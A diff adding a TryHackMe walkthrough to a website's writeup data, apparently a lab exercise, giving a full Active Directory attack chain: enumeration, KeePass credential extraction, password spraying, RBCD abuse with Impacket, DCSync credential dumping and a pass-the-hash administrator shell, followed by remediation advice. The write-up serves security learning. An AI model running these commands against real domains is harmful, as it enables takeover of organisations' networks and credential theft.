@@ -123,4 +123,133 @@ smb: \\> mget *</code></pre>
       <img src="/images/writeups/Proxy/evil-winrm.png" alt="Administrator Shell with Evil-WinRM" class="rounded border border-border my-4 w-full" />
     `,
   },
+  {
+    slug: "tryhackme-forward-walkthrough",
+    title: "TryHackMe: Forward Walkthrough",
+    excerpt: "Assumed breach Active Directory assessment: RDP pivoting, KeePass vault extraction, domain password spraying, and Domain Controller compromise via Resource-Based Constrained Delegation (RBCD).",
+    date: "Oct 2026",
+    readTime: "8 min",
+    platformTag: "TryHackMe",
+    tags: ["ActiveDirectory", "RBCD", "Kerberos", "BloodHound", "Impacket", "PrivEsc"],
+    contentHtml: `
+      <h2>1. Scenario: Assumed Breach</h2>
+      <p>The engagement begins under an assumed breach model with low-privilege domain user credentials:</p>
+      <pre><code>[ INITIAL ACCESS GRANTED ]
+DOMAIN : ctf.local
+USER   : ctf.local\\j.smith
+PASS   : JSmith@IT2024</code></pre>
+      
+      <p>Target Domain Controller: <code>DC01.ctf.local</code> (<code>10.112.186.154</code>)</p>
+
+      <h2>2. Initial Reconnaissance & Network Sweep</h2>
+      <p>We initiate the assessment with <strong>RustScan</strong> to rapidly discover open ports, piping them directly to Nmap for service detection:</p>
+      <pre><code>rustscan -a 10.112.186.154 -b 500 --top -- -sC -sV -Pn -oN Forward</code></pre>
+
+      <img src="/images/writeups/Forward/rustscan.png" alt="RustScan Port Discovery" class="rounded border border-border my-4 w-full" />
+
+      <p>The scan confirms a Windows-based Domain Controller (<strong>DC01.ctf.local</strong>):</p>
+      <ul>
+        <li><strong>Port 53:</strong> Microsoft DNS</li>
+        <li><strong>Port 88:</strong> Kerberos</li>
+        <li><strong>Port 135:</strong> MSRPC</li>
+        <li><strong>Port 389:</strong> LDAP</li>
+        <li><strong>Port 445:</strong> SMB</li>
+      </ul>
+
+      <img src="/images/writeups/Forward/rustscan+nmap.png" alt="Nmap Service Scan" class="rounded border border-border my-4 w-full" />
+
+      <p>Using <strong>NetExec (nxc)</strong>, we authenticate as <code>j.smith</code> and generate the hosts mapping:</p>
+      <pre><code>nxc smb 10.112.186.154 -u 'j.smith' -p 'JSmith@IT2024' --generate-hosts-file hosts</code></pre>
+      <img src="/images/writeups/Forward/nxc_generat-hosts-file.png" alt="NetExec Generate Hosts" class="rounded border border-border my-4 w-full" />
+
+      <p>We list the available shares and their permissions:</p>
+      <pre><code>nxc smb DC01.ctf.local -d ctf.local -u 'j.smith' -p 'JSmith@IT2024' --shares</code></pre>
+      <img src="/images/writeups/Forward/nxc_smb_shares-list.png" alt="SMB Shares List" class="rounded border border-border my-4 w-full" />
+
+      <p>Connecting with <code>impacket-smbclient</code> shows that the accessible shares do not contain any actionable artifacts:</p>
+      <pre><code>impacket-smbclient ctf.local/j.smith:'JSmith@IT2024'@ctf.local</code></pre>
+      <img src="/images/writeups/Forward/impacket-smbclient_see-shares.png" alt="SMBClient Check Shares" class="rounded border border-border my-4 w-full" />
+
+      <p>We export the list of domain users for future spraying:</p>
+      <pre><code>nxc smb DC01.ctf.local -d ctf.local -u 'j.smith' -p 'JSmith@IT2024' --users-export users</code></pre>
+      <img src="/images/writeups/Forward/nxc_smb_enum-users.png" alt="Enumerate Users" class="rounded border border-border my-4 w-full" />
+
+      <h2>3. Active Directory Graph Enumeration (BloodHound)</h2>
+      <p>We proceed with domain collection using <code>bloodhound-python</code>:</p>
+      <pre><code>bloodhound-python -u 'j.smith' -p 'JSmith@IT2024' -d ctf.local -dc DC01.ctf.local -ns 10.112.186.154 -c All --zip</code></pre>
+      <img src="/images/writeups/Forward/bloodhound_enum_zip.png" alt="BloodHound Ingestion Archive" class="rounded border border-border my-4 w-full" />
+      <img src="/images/writeups/Forward/bloodhound_enum_fileupload.png" alt="Upload to BloodHound" class="rounded border border-border my-4 w-full" />
+
+      <p>In BloodHound, we discover that <code>j.smith</code> is a member of the built-in <strong>REMOTE DESKTOP USERS</strong> group, permitting graphical remote login to the machine:</p>
+      <img src="/images/writeups/Forward/bloodhound_enum_j.smith.png" alt="BloodHound j.smith Node" class="rounded border border-border my-4 w-full" />
+
+      <h2>4. Lateral Movement: RDP Session & KeePass Discovery</h2>
+      <p>We launch a remote desktop session using <code>xfreerdp</code>:</p>
+      <pre><code>xfreerdp /u:j.smith /p:'JSmith@IT2024' /v:DC01.ctf.local /cert:ignore /dynamic-resolution</code></pre>
+      <img src="/images/writeups/Forward/xfreerdp_connect1.png" alt="RDP Connection" class="rounded border border-border my-4 w-full" />
+
+      <p>Searching the user directory in PowerShell reveals an encrypted KeePass database file:</p>
+      <pre><code>Get-ChildItem -Path 'C:\\Users\\j.smith\\' -Recurse</code></pre>
+      <img src="/images/writeups/Forward/rdp_data .png" alt="KeePass Database Found" class="rounded border border-border my-4 w-full" />
+
+      <p>Opening KeePass 2, we authenticate using the Windows User Account option without entering a master password. The database reveals stored credentials for user <strong>t.jones</strong>:</p>
+      <img src="/images/writeups/Forward/rdp_tjones.png" alt="KeePass t.jones Password" class="rounded border border-border my-4 w-full" />
+
+      <p>We test the credentials using NetExec and authenticate as <code>t.jones</code>:</p>
+      <pre><code>nxc smb DC01.ctf.local -d ctf.local -u 't.jones' -p '&lt;passwd&gt;' --shares</code></pre>
+      <img src="/images/writeups/Forward/t-jones_smb_verfi.png" alt="NetExec t.jones Verification" class="rounded border border-border my-4 w-full" />
+
+      <h2>5. Lateral Movement: Password Spraying</h2>
+      <p>With valid credentials for <code>t.jones</code>, we spray the password across the harvested domain user list:</p>
+      <pre><code>nxc smb DC01.ctf.local -d ctf.local -u users -p '&lt;passwd&gt;' --continue-on-success</code></pre>
+      <img src="/images/writeups/Forward/nxc_passwd_spray.png" alt="Password Spray Results" class="rounded border border-border my-4 w-full" />
+
+      <p><strong>Result:</strong> <code>r.williams</code> shares the exact same password as <code>t.jones</code>!</p>
+
+      <h2>6. Escalate Privileges: Resource-Based Constrained Delegation (RBCD)</h2>
+      <p>In BloodHound, we inspect the outbound permissions for <strong>r.williams</strong> and find the <strong>AddAllowedToAct</strong> edge over the Domain Controller:</p>
+      <img src="/images/writeups/Forward/bloodhound_rwilliams.png" alt="BloodHound r.williams AddAllowedToAct" class="rounded border border-border my-4 max-w-md mx-auto block shadow-sm" />
+
+      <h3>Understanding RBCD vs. Traditional Constrained Delegation</h3>
+      <ul>
+        <li><strong>Traditional Constrained Delegation:</strong> Configured on the front-end service account (<code>msDS-AllowedToDelegateTo</code>) by a Domain Admin.</li>
+        <li><strong>Resource-Based Constrained Delegation:</strong> Configured directly on the target resource (<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>). Anyone with write access over the target computer can configure which accounts are allowed to impersonate users to it.</li>
+      </ul>
+
+      <p><strong>Step 1:</strong> We create a new machine account (<code>SYS$</code>) in the domain using <code>r.williams</code>' credentials:</p>
+      <pre><code>impacket-addcomputer ctf.local/r.williams:'&lt;passwd&gt;' -computer-name SYS$ -computer-pass '&lt;passwd&gt;' -dc-ip DC01.ctf.local</code></pre>
+      <img src="/images/writeups/Forward/impacket-addaccont.png" alt="Impacket Add Computer" class="rounded border border-border my-4 w-full" />
+
+      <p><strong>Step 2:</strong> We write our controlled <code>SYS$</code> machine account into the DC's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute:</p>
+      <pre><code>impacket-rbcd ctf.local/r.williams:'&lt;passwd&gt;' -dc-ip DC01.ctf.local -delegate-from 'SYS$' -delegate-to 'DC01$' -action 'write'</code></pre>
+      <img src="/images/writeups/Forward/impacket-rbcd.png" alt="Impacket RBCD Write" class="rounded border border-border my-4 w-full" />
+
+      <p><strong>Step 3:</strong> Using <code>SYS$</code>, we abuse S4U2Self and S4U2Proxy to request a Kerberos service ticket for <code>cifs/DC01.ctf.local</code> while impersonating <strong>Administrator</strong>:</p>
+      <pre><code>impacket-getST -dc-ip DC01.ctf.local -spn cifs/DC01.ctf.local -impersonate Administrator ctf.local/SYS$:'&lt;passwd&gt;'</code></pre>
+      <img src="/images/writeups/Forward/impacket-getST.png" alt="Impacket getST Impersonate" class="rounded border border-border my-4 w-full" />
+
+      <p>We export the ticket into our environment:</p>
+      <pre><code>export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache</code></pre>
+
+      <p><strong>Step 4:</strong> We execute DCSync against the Domain Controller using the Kerberos ticket:</p>
+      <pre><code>impacket-secretsdump -k -no-pass ctf.local/Administrator@DC01.ctf.local</code></pre>
+      <img src="/images/writeups/Forward/impacket-secrets.png" alt="SecretsDump DCSync" class="rounded border border-border my-4 w-full" />
+
+      <h2>7. Gaining Shell & Capturing the Flag</h2>
+      <p>With the Administrator NTLM hash obtained, we authenticate over WinRM using <strong>Evil-WinRM</strong>:</p>
+      <pre><code>evil-winrm -u Administrator -H &lt;hash&gt; -i DC01.ctf.local</code></pre>
+      <img src="/images/writeups/Forward/evil-winrm.png" alt="Evil-WinRM Administrator Shell" class="rounded border border-border my-4 w-full" />
+
+      <p>Locate and capture the final flag:</p>
+      <pre><code>Get-ChildItem -Path "C:\\Users\\Administrator" -Filter "*.txt" -Recurse</code></pre>
+
+      <h2>8. Key Takeaways & Remediation</h2>
+      <ul>
+        <li><strong>Audit ACLs on Computer Objects:</strong> Restrict write permissions on Domain Controllers to Domain Admins only. Helpdesk and standard users should never hold <code>GenericWrite</code> or <code>WriteProperty</code> on tier-0 assets.</li>
+        <li><strong>Set MachineAccountQuota to 0:</strong> Prevent unprivileged domain users from joining new computer accounts to the domain.</li>
+        <li><strong>Enforce Unique Passwords:</strong> Disallow password reuse across users to mitigate horizontal spraying attacks.</li>
+        <li><strong>Protect High-Privilege Accounts:</strong> Add Domain Admins to the <em>Protected Users</em> group to prevent Kerberos delegation impersonation.</li>
+      </ul>
+    `,
+  },
 ];
